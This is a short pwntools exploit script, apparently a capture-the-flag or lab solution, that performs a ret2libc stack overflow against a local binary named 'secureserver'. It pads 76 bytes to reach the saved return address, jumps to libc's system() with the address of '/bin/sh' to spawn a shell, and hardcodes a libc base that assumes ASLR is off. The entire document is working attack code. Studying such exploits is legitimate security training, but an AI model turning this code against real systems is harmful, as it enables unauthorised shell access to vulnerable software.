from pwn import *

prcs = './secureserver'
elf = context.binary = ELF(prcs, checksec=False)
context.log_level = 'debug'

p = process(prcs)

# for this one we wanna redirect execution to a function called 'system' on the libc 
# we are going to give it '/bin/sh' as an argument so that it gets us a shell.

eip_offset = 76

# with ASLR off the libc is located at the same @ each time
libc_base = 0xf7d7e000
# these offsets should remain the same even with ASLR on
system = libc_base + 0x50430
binsh = libc_base + 0x1c4de8

payload = flat(
    asm('nop') * eip_offset,
    system,
    0x0,
    binsh
)

p.sendlineafter(b':', payload)
p.interactive()